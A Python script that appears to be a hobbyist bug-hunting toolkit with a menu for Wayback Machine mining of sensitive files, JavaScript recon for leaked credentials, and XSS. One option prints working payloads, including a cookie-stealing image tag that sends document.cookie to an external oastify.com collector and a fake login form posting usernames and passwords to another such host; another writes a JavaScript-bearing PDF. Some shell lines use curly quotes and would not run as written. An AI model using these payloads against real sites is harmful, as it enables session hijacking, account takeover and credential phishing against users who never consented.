import os
import colorama
import time
from colorama import Fore
import webbrowser

os.system('cls' if os.name == 'nt' else 'clear')

colorama.init(autoreset=True)

main_screen = rf"""
{Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
{Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
{Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.1{Fore.WHITE}
{Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True{Fore.WHITE}
{Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
{Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 

{Fore.WHITE}Developed By: {Fore.RED}Z3RO {Fore.BLUE}Discord: {Fore.GREEN}@313top{Fore.WHITE}
{Fore.WHITE}Press 1 to go to main menu
"""

print(main_screen)
main_load = input("</#root\> ")

if main_load == "1":
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        main_menu_screen = rf"""
        {Fore.RED}██╗  ██╗{Fore.BLUE}██████╗ ██╗   ██╗ ██████╗
        {Fore.RED}╚██╗██╔╝{Fore.BLUE}██╔══██╗██║   ██║██╔════╝ 
        {Fore.RED} ╚███╔╝ {Fore.BLUE}██████╔╝██║   ██║██║  ███╗  {Fore.WHITE}Version = {Fore.GREEN}1.1 
        {Fore.RED} ██╔██╗ {Fore.BLUE}██╔══██╗██║   ██║██║   ██║  {Fore.WHITE}Lastest Version: {Fore.GREEN}True
        {Fore.RED}██╔╝ ██╗{Fore.BLUE}██████╔╝╚██████╔╝╚██████╔╝
        {Fore.RED}╚═╝  ╚═╝{Fore.BLUE}╚═════╝  ╚═════╝  ╚═════╝ 

        {Fore.WHITE}Developed By: {Fore.RED}Z3RO {Fore.BLUE}Discord: {Fore.GREEN}@313top{Fore.WHITE}
        {Fore.WHITE}More Coming Soon!

        [{Fore.RED}0{Fore.BLUE}1{Fore.WHITE}] Access {Fore.RED}404{Fore.WHITE} files of any server
        [{Fore.RED}0{Fore.BLUE}2{Fore.WHITE}] {Fore.YELLOW}JavaScript {Fore.WHITE}Recon Masterclass {Fore.RED}( Hard To Use # Static ){Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}3{Fore.WHITE}] {Fore.RED}WayBackArchive {Fore.YELLOW}Instant{Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}4{Fore.WHITE}] {Fore.GREEN}Blind XSS {Fore.WHITE}Full {Fore.RED}Account{Fore.WHITE} TakeOver {Fore.RED}( Tutorial ){Fore.WHITE}
        [{Fore.RED}0{Fore.BLUE}5{Fore.WHITE}] {Fore.YELLOW}PDF {Fore.WHITE}Stored {Fore.GREEN}XSS{Fore.WHITE}
        """
        print(main_menu_screen)
        main_menu_screen_choice = input("</#root\> ")

        if main_menu_screen_choice == "1":
            print(f"{Fore.RED}WARNING: MAKE SURE TO BE IN KALI LINUX OR UBUNTU!!!")
            print(f"Please wait 3 seconds{Fore.RED}...") 
            time.sleep(3)
            print(f"Example: policybazaar.com {Fore.RED}( ONLY! )")
            print(f"{Fore.YELLOW}File Will Be Saved in Output.txt")
            website_target = input("Website ( Target ): ")
            os.system("touch output.txt")
            os.system("truncate -s 0 output.txt")
            os.system(f'curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.{website_target}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > output.txt')
            os.system("du -h output.txt")
            print(f"{Fore.GREEN}Finished Downloading Links Now Getting Juicy Important Files...") 
            print(f"Please Wait 5 seconds{Fore.RED}...")
            time.sleep(5)
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system("cat output.txt | grep -E '\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5|\\.exe|\\.dll|\\.bin|\\.ini|\\.bat|\\.sh|\\.tar|\\.deb|\\.rpm|\\.iso|\\.img|\\.apk|\\.msi|\\.dmg|\\.tmp|\\.crt|\\.pem|\\.key|\\.pub|\\.asc'")
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "2":
            print(f"{Fore.RED}WARNING: MAKE SURE TO BE IN KALI LINUX OR UBUNTU!!!")
            print(f"{Fore.RED}WARNING: Watch this video before using it")
            print(f"{Fore.RED}https://www.youtube.com/watch?v=FWPXWBh4EFw&t ( Will Help 100% )")
            print(f"Please wait 3 seconds{Fore.RED}...")
            time.sleep(3)
            website_target = input("Website ( Target ): ")
            os.system(f'katana -u {website_target} -d 5 -jc | grep ‘\.js$’ | tee alljs.txt')
            os.system('echo www.samsung.com | gau | grep .js | anew alljs.txt')
            os.system('cat alljs.txt | httpx-toolkit -mc 200 -o samsung.txt')
            os.system('cat samsung.txt | jsleaks -s -l -k')
            os.system('cat samsung.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30')
            os.system('cat samsung.txt | nuclei -t /home/YOURFILEDEC/nuclei-templates/http/exposures -c 30')
            os.system('cat samsung.txt | xargs -I{} bash -c ‘echo -e “\ntarget : {}\n” && python Files/lazyegg.py “{}” — js_urls — domains — ips — leaked_creds — local_storage’')
            os.system('cls' if os.name == 'nt' else 'clear')
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "3":
            print(f"Please wait 2 seconds{Fore.RED}...")
            time.sleep(2)
            website_target = input("Website ( Target ): ")
            url = f"https://web.archive.org/web/*/{website_target}"
            time.sleep(2)
            webbrowser.open(url)
            os.system('cls' if os.name == 'nt' else 'clear')
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "4":
            print("""
            HTMLi:
            <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;

            RXSS:
            <img src/onerror=prompt(document.cookie)>

            IFrame:
            "><iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%">

            ATO:
            <img src=x  onerror="document.location='http://o0p70yehe4avf6728g095671asgj49sy.oastify.com?c='+document.cookie;" />

            PHISHING:
            <h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
            Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
            <input type="submit" value="Login"></br>

            For Account Takeover Great Website: https://xss.report/dashboard
            """)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')

        elif main_menu_screen_choice == "5":
            pdf_say = input("What do you want pdf to say: ")
            pdf_code = f"""%PDF-1.7
        1 0 obj
        << /Pages 1 0 R /OpenAction 2 0 R >>
        2 0 obj
        << /S /JavaScript /JS (app.alert("{pdf_say}")) >>
        trailer << /Root 1 0 R >>
            """
    
            with open("pdf_xss.pdf", "w") as pdf_file:
                pdf_file.write(pdf_code)
            input(f"{Fore.BLUE}Press Enter to go back{Fore.RED}...")
            os.system('cls' if os.name == 'nt' else 'clear')
